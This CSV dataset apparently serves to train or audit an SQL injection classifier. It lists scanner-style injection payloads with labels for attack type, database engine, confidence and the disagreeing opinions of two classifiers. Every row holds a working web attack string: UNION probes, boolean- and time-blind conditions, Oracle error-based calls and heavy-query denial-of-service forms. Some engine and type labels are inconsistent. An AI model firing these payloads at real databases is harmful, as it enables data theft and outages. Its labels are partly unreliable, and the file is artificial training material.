payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1"" ) union all select null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1334,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) union all select null,null,null,null#"
"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""uqor"" like ""uqor",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,1335,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""uqor"" like ""uqor"
select ( case when ( 9667 = 6212 ) then 9667 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,oracle,1336,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,select ( case when ( 9667 = 6212 ) then 9667 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
"-5379' ) union all select 4294,4294,4294--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1337,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5379' ) union all select 4294,4294,4294--"
1 ) as kaew where 2658 = 2658,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1338,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as kaew where 2658 = 2658
-6588' where 7793 = 7793 or ( 8459 = 8459 ) *4906--,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1339,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-6588' where 7793 = 7793 or ( 8459 = 8459 ) *4906--
1'|| ( select 'miew' where 8360 = 8360 waitfor delay '0:0:5' ) ||',time_blind,mssql,0.9,waitfor delay for time blind,KEEP,,time_blind,mssql,1340,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1'|| ( select 'miew' where 8360 = 8360 waitfor delay '0:0:5' ) ||'
"-5672%"" or 3825 = 9675--",boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1341,boolean_blind,generic,Pattern match: 'or 3825 = 9675' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-5672%"" or 3825 = 9675--"
1' where 2547 = 2547 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1342,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' where 2547 = 2547 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --
select sleep ( 5 ) and ( ( '%' = ',time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1343,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( ( '%' = '
select ( case when ( 3537 = 5218 ) then 3537 else 3537* ( select 3537 from mysql.db ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,1344,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 3537 = 5218 ) then 3537 else 3537* ( select 3537 from mysql.db ) end ) #
1 and 5934 = 7745,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1345,boolean_blind,generic,Pattern match: 'and 5934 = 7745' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 and 5934 = 7745
-4960' ) union all select 5300--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1346,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-4960' ) union all select 5300--
1' ) ) or sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1347,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' ) ) or sleep ( 5 ) #
1 ) or sleep ( 5 ),time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1348,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1 ) or sleep ( 5 )
"1"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""tfrs"" = ""tfrs",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1349,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""tfrs"" = ""tfrs"
"1%' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = '",boolean_blind,mssql,0.8,CONVERT for MSSQL blind,KEEP,,boolean_blind,mssql,1350,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%' ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = '"
"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'fnjm' = 'fnjm",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,1351,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'fnjm' = 'fnjm"
"-5622"" where 7970 = 7970 union all select 7970,7970,7970,7970,7970--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1352,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5622"" where 7970 = 7970 union all select 7970,7970,7970,7970,7970--"
"-1263"" ) or 9323 = 9323#",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1353,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-1263"" ) or 9323 = 9323#"
select ( case when ( 9318 = 7198 ) then 9318 else 9318* ( select 9318 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,1354,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 9318 = 7198 ) then 9318 else 9318* ( select 9318 from information_schema.character_sets ) end ) #
1' rlike sleep ( 5 ) and 'cugs' = 'cugs,time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,1355,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' rlike sleep ( 5 ) and 'cugs' = 'cugs
1 where 7224 = 7224 and sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1356,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 where 7224 = 7224 and sleep ( 5 ) #
-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 1248 = 1248,error_based,oracle,0.9,xmltype() for Oracle error-based,KEEP,,error_based,oracle,1357,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 1248 = 1248
1' ) ) as xpmy where 5274 = 5274 rlike ( select ( case when ( 6252 = 7704 ) then 1 else 0x28 end ) ) --,boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,1358,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) as xpmy where 5274 = 5274 rlike ( select ( case when ( 6252 = 7704 ) then 1 else 0x28 end ) ) --
1 ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,1359,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )
"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""kfps"" = ""kfps",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1360,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""kfps"" = ""kfps"
"1"" ) where 6311 = 6311",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1361,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 6311 = 6311"
"-7423 or make_set ( 9354 = 9354,7185 ) -- hprc",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1362,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-7423 or make_set ( 9354 = 9354,7185 ) -- hprc"
( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 5877 = 5877 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ),boolean_blind,generic,0.8,IN with char concatenation,KEEP,,boolean_blind,generic,1363,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 5877 = 5877 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) )
"-1351"" where 6968 = 6968 or 5684 = 8582",boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1364,boolean_blind,generic,Pattern match: 'or 5684 = 8582' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-1351"" where 6968 = 6968 or 5684 = 8582"
"-1030"" where 2161 = 2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1365,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1030"" where 2161 = 2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--"
"-4764"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""dfvz"" like ""dfvz",boolean_blind,generic,0.8,IN with char for blind,KEEP,,boolean_blind,generic,1366,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-4764"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""dfvz"" like ""dfvz"
"1 where 1776 = 1776 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1367,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 where 1776 = 1776 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"1 where 3799 = 3799 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1368,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 where 3799 = 3799 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
"-9672' ) ) as rupb where 8218 = 8218 or make_set ( 4954 = 1836,1836 ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1369,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-9672' ) ) as rupb where 8218 = 8218 or make_set ( 4954 = 1836,1836 ) --"
"1%"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1370,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
1'+ ( select 'jtvq' where 8288 = 8288 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1371,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1'+ ( select 'jtvq' where 8288 = 8288 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #
"1'+ ( select 'uijv' where 7279 = 7279 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1372,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1'+ ( select 'uijv' where 7279 = 7279 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --"
1%' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( '%' = ',error_based,oracle,0.9,utl_inaddr for Oracle error-based,KEEP,,error_based,oracle,1373,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,1%' ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( '%' = '
"-5579%"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,boolean_blind,generic,0.8,IN with char for blind,KEEP,,boolean_blind,generic,1374,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-5579%"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """
1 ) where 2734 = 2734 waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor delay for time blind,KEEP,,time_blind,mssql,1375,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1 ) where 2734 = 2734 waitfor delay '0:0:5'--
1' ) ) as nhkp where 8030 = 8030,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1376,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as nhkp where 8030 = 8030
1 ) ) as gygm where 4024 = 4024,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1377,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as gygm where 4024 = 4024
"-2448%"" ) or 3038 = 3038",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1378,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-2448%"" ) or 3038 = 3038"
"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'xzcr' = 'xzcr",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1379,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'xzcr' = 'xzcr"
1 ) ) as sipp where 1999 = 1999 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1380,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) ) as sipp where 1999 = 1999 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --
"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""ikaf"" like ""ikaf",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1381,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""ikaf"" like ""ikaf"
"-1485' ) ) ) union all select 7661,7661,7661,7661,7661--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1382,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1485' ) ) ) union all select 7661,7661,7661,7661,7661--"
1 ) as jqbp where 5407 = 5407 and 4595 = 4595#,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1383,boolean_blind,generic,Pattern match: 'and 4595 = 4595' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) as jqbp where 5407 = 5407 and 4595 = 4595#
"select dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 70 ) ||chr ( 106 ) ||chr ( 78 ) ,5 ) from dual--",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1384,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"select dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 70 ) ||chr ( 106 ) ||chr ( 78 ) ,5 ) from dual--"
"1%' ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1385,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) union all select null,null,null,null,null,null,null,null,null#"
-6165%' ) ) union all select 5384#,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1386,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-6165%' ) ) union all select 5384#
1 ) ) as msug where 3503 = 3503 and sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1387,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) ) as msug where 3503 = 3503 and sleep ( 5 ) #
"1' ) ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1388,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) ) union all select null,null,null,null,null,null,null,null,null,null--"
"1"" ) where 2656 = 2656 or sleep ( 5 ) --",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1389,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) where 2656 = 2656 or sleep ( 5 ) --"
-7786' ) ) or 9323 = 9323#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1390,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7786' ) ) or 9323 = 9323#
"1'|| ( select 'gwxc' from dual where 3626 = 3626 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1391,boolean_blind,oracle,generic SQL keywords without specific signal,heavy_query,oracle,contains 7+ digit number (DoS-style payload),"1'|| ( select 'gwxc' from dual where 3626 = 3626 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
-5534 or 1983 = 5721#,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1392,boolean_blind,generic,Pattern match: 'or 1983 = 5721' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-5534 or 1983 = 5721#
"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ""wrbs"" like ""wrbs",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1393,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ""wrbs"" like ""wrbs"
